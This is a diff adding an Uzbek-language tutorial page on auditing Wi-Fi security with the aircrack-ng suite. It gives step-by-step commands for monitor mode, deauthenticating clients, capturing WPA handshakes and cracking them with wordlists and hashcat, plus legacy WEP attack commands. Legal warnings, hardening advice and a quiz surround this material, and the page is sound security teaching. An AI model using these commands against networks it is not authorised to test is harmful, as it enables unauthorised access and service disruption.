@@ -1,0 +1,379 @@
+---
+title: "Aircrack-ng — Wi-Fi xavfsizlik audit"
+description: "Aircrack-ng suite — WPA/WEP audit, Kali Linux'da."
+order: 5
+level: "advanced"
+estimated_minutes: 11
+prerequisites:
+  - "/kali/ethical-hacking"
+  - "/kali/what-is-kali"
+learning_objectives:
+  - "Aircrack-ng suite vositalar"
+  - "Monitor mode va packet capture"
+  - "WPA handshake capture"
+  - "Wordlist va dictionary attack"
+  - "Faqat o'z tarmoq'ingiz uchun"
+tags: ["kali", "aircrack", "wifi", "security"]
+lastUpdated: "2026-05-26"
+author: "LinuxHubuz jamoasi"
+references:
+  - title: "Aircrack-ng Official"
+    url: "https://www.aircrack-ng.org/"
+  - title: "Kali Tools — Aircrack-ng"
+    url: "https://www.kali.org/tools/aircrack-ng/"
+---
+
+**Aircrack-ng** — Wi-Fi tarmoq xavfsizligini tahlil qilish uchun vositalar to'plami. Kali Linux'da default. WEP, WPA/WPA2 audit, packet capture, handshake'lar.[¹](https://www.aircrack-ng.org/)
+
+<Callout type="warning" title="QONUNIY OGOHLANTIRISH">
+Aircrack-ng faqat **o'zingiz ega bo'lgan yoki yozma ruxsat olingan** tarmoqlar uchun ishlatish mumkin. Boshqalarning Wi-Fi'siga ruxsatsiz kirish — **jinoyat**. O'zbekiston Jinoyat Kodeksi 278-modda — kompyuter tizimlariga noqonuniy kirish, jazo: katta jarima yoki ozodlikdan mahrum etish.
+</Callout>
+
+<Callout type="info" title="Bu darsda nimani o'rganasiz">
+- Aircrack-ng suite tarkibi.
+- Monitor mode (`airmon-ng`).
+- Tarmoq'larni topish (`airodump-ng`).
+- Handshake capture.
+- Wordlist attack (`aircrack-ng`).
+- O'z tarmoq'ingizni qanday himoyalash.
+</Callout>
+
+## 1. Suite vositalari
+
+| Vosita | Maqsad |
+|---|---|
+| `airmon-ng` | Monitor mode |
+| `airodump-ng` | Packet capture, tarmoq sniffing |
+| `aireplay-ng` | Packet injection (deauth, faqat lab) |
+| `aircrack-ng` | Handshake crack (offline) |
+| `airdecap-ng` | WEP/WPA decrypt |
+| `besside-ng` | Avtomatik WPA crack |
+| `wesside-ng` | Avtomatik WEP crack |
+
+## 2. Wireless adapter
+
+Kerakli xususiyatlar:
+
+- **Monitor mode** qo'llab-quvvatlash.
+- **Packet injection** qo'llab-quvvatlash.
+
+Tavsiya etiladigan chipsetlar:
+
+- **Atheros AR9271** (TP-Link TL-WN722N v1)
+- **Realtek RTL8812AU** (Alfa AWUS036ACH)
+- **Ralink RT3070** (Alfa AWUS036NH)
+
+Tekshirish:
+
+```bash
+# Interface ro'yxati
+ip link show
+# wlan0: <NO-CARRIER,BROADCAST,...>
+
+# Driver
+lspci -k | grep -A 3 -i wireless
+# yoki USB
+lsusb
+```
+
+## 3. Monitor mode
+
+Normal "managed" rejim — faqat o'z tarmog'idan paket olib oladi.
+Monitor rejim — efirdagi hamma paketni ko'radi.
+
+```bash
+# Boshqa servislarni o'chirish
+sudo airmon-ng check kill
+
+# Monitor mode yoqish
+sudo airmon-ng start wlan0
+# wlan0 → wlan0mon (yoki mon0)
+
+# Tekshirish
+iw dev wlan0mon info
+# type monitor
+
+# Qaytarish (normal mode'ga)
+sudo airmon-ng stop wlan0mon
+sudo systemctl start NetworkManager
+```
+
+## 4. Tarmoq'larni topish
+
+```bash
+sudo airodump-ng wlan0mon
+
+# Chiqish — ESSID, BSSID, CH, PWR, ENC, AUTH
+# CH 6 ][ Elapsed: 12 s ][ 2026-05-26 14:30
+#
+# BSSID              PWR  Beacons    Data, #/s  CH  MB   ENC  CIPHER  AUTH ESSID
+# AA:BB:CC:11:22:33   -45      120        15    0   6  130  WPA2 CCMP   PSK  MyHomeWiFi
+#
+# BSSID              STATION            PWR   Rate    Lost    Frames  Probe
+# AA:BB:CC:11:22:33  DD:EE:FF:44:55:66  -50    0 - 1      0      30
+```
+
+Maydonlar:
+
+- **BSSID** — access point MAC.
+- **PWR** — signal kuchi (-45 dB yaqin).
+- **CH** — kanal (1-13).
+- **ENC** — encryption (WEP, WPA, WPA2).
+- **ESSID** — tarmoq nomi.
+- **STATION** — ulangan klient.
+
+## 5. Aniq tarmoq kuzatish
+
+```bash
+sudo airodump-ng -c 6 --bssid AA:BB:CC:11:22:33 -w capture wlan0mon
+```
+
+- `-c 6` — kanal 6.
+- `--bssid` — aniq AP.
+- `-w capture` — fayllarga yozish (`capture-01.cap`, `capture-01.csv`...).
+
+Endi handshake kutamiz (klient ulanganda).
+
+## 6. Handshake — qachon?
+
+WPA/WPA2 handshake — klient AP'ga ulanganda 4-yo'l qadami amalga oshadi. Bu ma'lumot crack uchun kerak.
+
+Variantlar:
+
+1. **Kutish** — yangi klient ulanguncha.
+2. **Deauth** — mavjud klientni vaqtinchalik uzib, qayta ulanishga majburlash (faqat lab).
+
+```bash
+# Deauth — faqat o'z tarmog'ingizda!
+sudo aireplay-ng --deauth 5 -a AA:BB:CC:11:22:33 -c DD:EE:FF:44:55:66 wlan0mon
+```
+
+Birinchi terminal'da:
+
+```
+CH 6 ][ Elapsed: 1 min ][ 2026-05-26 14:35 ][ WPA handshake: AA:BB:CC:11:22:33
+```
+
+`WPA handshake:` — muvaffaqiyat!
+
+## 7. Handshake tekshirish
+
+```bash
+aircrack-ng capture-01.cap
+# Opening capture-01.cap
+# Read 1234 packets.
+#    #  BSSID              ESSID                     Encryption
+#    1  AA:BB:CC:11:22:33  MyHomeWiFi                WPA (1 handshake)
+```
+
+## 8. Wordlist attack
+
+```bash
+# rockyou.txt — Kali'da default
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+
+aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:11:22:33 capture-01.cap
+
+# Chiqish (agar parol topilsa):
+# KEY FOUND! [ MyPassword123 ]
+```
+
+Crack speed CPU/GPU'ga bog'liq:
+
+- CPU — 1000-5000 parol/soniya.
+- GPU (hashcat) — 100K-1M parol/soniya.
+
+## 9. Hashcat (GPU crack)
+
+```bash
+# Cap → hccapx (yoki hc22000 yangi format)
+hcxpcapngtool -o capture.hc22000 capture-01.cap
+
+# Hashcat
+hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt
+# yoki rules bilan
+hashcat -m 22000 capture.hc22000 wordlist.txt -r /usr/share/hashcat/rules/best64.rule
+```
+
+## 10. Wordlist'lar
+
+Kali'da:
+
+```
+/usr/share/wordlists/
+├── rockyou.txt.gz       # ~14M parol
+├── dirb/
+├── dirbuster/
+├── fasttrack.txt
+└── metasploit/
+```
+
+Yana:
+
+- **SecLists** — `apt install seclists`
+- **CrackStation** — 1.5 milliard parol
+- **Custom** — target asosida (`cewl`, `crunch`)
+
+## 11. Wi-Fi himoyasi (o'z tarmog'ingiz)
+
+Audit natijasida his etgan zaifliklar:
+
+1. **Parol kuchli** — minimum 16 belgi, random.
+2. **WPA3** — WPA2'dan kuchliroq (yangi router).
+3. **WPS o'chirilgan** — `Reaver` atakkasi.
+4. **MAC filter** — qo'shimcha qatlam (yengil bypass).
+5. **SSID hide** — qo'shimcha (yengil bypass).
+6. **Hotspot bo'lmaslik** — alohida guest tarmoq.
+7. **Router firmware** — yangilangan.
+
+Kuchli parol:
+
+```bash
+# Bash'da
+openssl rand -base64 24
+# Yoki
+pwgen -s 24 1
+```
+
+## 12. WEP — eskirgan
+
+WEP — 2003'da hack qilingan, hozir hech qaerda ishlatilmaydi. 5-10 daqiqada crack mumkin.
+
+```bash
+# Faqat tarixiy ma'lumot
+airodump-ng -c CH --bssid BSSID -w wep wlan0mon
+aireplay-ng -1 0 -a BSSID wlan0mon
+aireplay-ng -3 -b BSSID wlan0mon
+aircrack-ng wep-01.cap
+```
+
+Agar router WEP — darhol WPA2/WPA3 ga yangilang.
+
+## 13. Misol — to'liq audit (o'z tarmog'ingiz)
+
+```bash
+# 1. Monitor mode
+sudo airmon-ng check kill
+sudo airmon-ng start wlan0
+
+# 2. Tarmoq topish
+sudo airodump-ng wlan0mon
+# Ctrl+C — kerakli BSSID va kanalni yozib oling
+
+# 3. Kuzatish
+sudo airodump-ng -c 6 --bssid AA:BB:CC:11:22:33 -w mywifi wlan0mon
+
+# 4. Deauth (alohida terminal)
+sudo aireplay-ng --deauth 5 -a AA:BB:CC:11:22:33 wlan0mon
+
+# 5. Handshake olinganda Ctrl+C
+
+# 6. Crack
+aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:11:22:33 mywifi-01.cap
+
+# 7. Cleanup
+sudo airmon-ng stop wlan0mon
+sudo systemctl start NetworkManager
+```
+
+## 14. Tahlil natijalari (faraziy)
+
+| Parol | Crack vaqti |
+|---|---|
+| `12345678` | < 1 soniya |
+| `password` | < 1 soniya |
+| `Hello123` | ~10 daqiqa |
+| `MyHomeWiFi2024` | ~1 soat (target wordlist) |
+| `Tr0ub4dor&3` | ~1 hafta (rules) |
+| `correct horse battery staple` | ~10 yil |
+| `random_24_chars_$8Gh!` | imkonsiz |
+
+## 15. Eng tez-tez uchraydigan xatolar
+
+- **`airmon-ng check kill` qilmaslik** — NetworkManager interface'ni egallaydi.
+- **Adapter monitor mode'ni qo'llab-quvvatlamaydi** — internal chip'lar yo'q.
+- **Handshake yo'q** — klient yo'q, deauth ham faqat mavjud klient'ni urganda.
+- **Wordlist parolni o'z ichida bilmaydi** — random parol crack qilib bo'lmaydi.
+- **Boshqa tarmoq'ni urinish** — qonunbuzar.
+
+## 16. Eng yaxshi amaliyot
+
+- **Faqat o'z tarmog'ingiz** — yozma ruxsatsiz hech qachon.
+- **Lab muhiti** — VM, alohida router.
+- **Disclosure** — agar boshqa joydan zaiflik topdingiz, owner'ga xabar bering.
+- **Bug bounty** — qonuniy yo'l.
+- **Defensive security** — o'z tarmog'ingizni kuchli sozlash.
+
+## 17. Mashqlar
+
+1. **Adapter:** Monitor mode test (`airmon-ng start wlan0`).
+2. **Skan:** O'z tarmog'ingizni `airodump-ng` bilan topish.
+3. **Handshake:** O'z router'ingizdan handshake olish.
+4. **Crack:** Kuchsiz test parol (`12345678`) bilan crack — vaqtni o'lchang.
+5. **Himoya:** O'z parolingiz qancha mustahkam? `rockyou.txt`'da bormi?
+
+## 18. Bilim sinovi
+
+**Savol 1.** Monitor mode nima?
+
+- a) Hamma paketlarni ko'radigan rejim
+- b) Faqat o'z paketlarini
+- c) Tezroq rejim
+- d) Yo'q
+
+<Callout type="success" title="Javob">
+**(a)** Adapter efirdagi barcha 802.11 paketlarni qabul qiladi.[¹](https://www.aircrack-ng.org/)
+</Callout>
+
+**Savol 2.** WPA2 handshake nima beradi?
+
+- a) To'g'ridan-to'g'ri parol
+- b) Offline crack uchun kerakli ma'lumot
+- c) Backup
+- d) Hech narsa
+
+<Callout type="success" title="Javob">
+**(b)** Hash bilan parol'ni offline tekshirish.
+</Callout>
+
+**Savol 3.** WPA3 vs WPA2:
+
+- a) WPA3 zaifroq
+- b) WPA3 — SAE (Simultaneous Authentication of Equals), offline crack imkonsizroq
+- c) Bir xil
+- d) WPA3 — Wi-Fi yo'q
+
+<Callout type="success" title="Javob">
+**(b)** SAE algoritmi — offline brute-force qiyinroq.
+</Callout>
+
+**Savol 4.** Boshqa odam tarmog'ini crack qilish:
+
+- a) OK agar mehmon
+- b) Jinoyat (yozma ruxsatsiz)
+- c) Faqat tunda
+- d) OK ta'lim uchun
+
+<Callout type="success" title="Javob">
+**(b)** Yozma ruxsatsiz har qanday ulanish — jinoyat (O'zbekiston JK 278-modda).
+</Callout>
+
+**Savol 5.** Eng yaxshi himoya:
+
+- a) MAC filter
+- b) SSID hide
+- c) WPA3 + kuchli random parol (24+ belgi)
+- d) WEP
+
+<Callout type="success" title="Javob">
+**(c)** WPA3 va random uzun parol — eng yuqori himoya.
+</Callout>
+
+## Manbalar
+
+1. Aircrack-ng Official. [https://www.aircrack-ng.org/](https://www.aircrack-ng.org/)
+2. Kali Tools — Aircrack-ng. [https://www.kali.org/tools/aircrack-ng/](https://www.kali.org/tools/aircrack-ng/)
+
+## Keyingi qadam
+
+👉 [Kali — John the Ripper](/kali/tools/john-the-ripper)
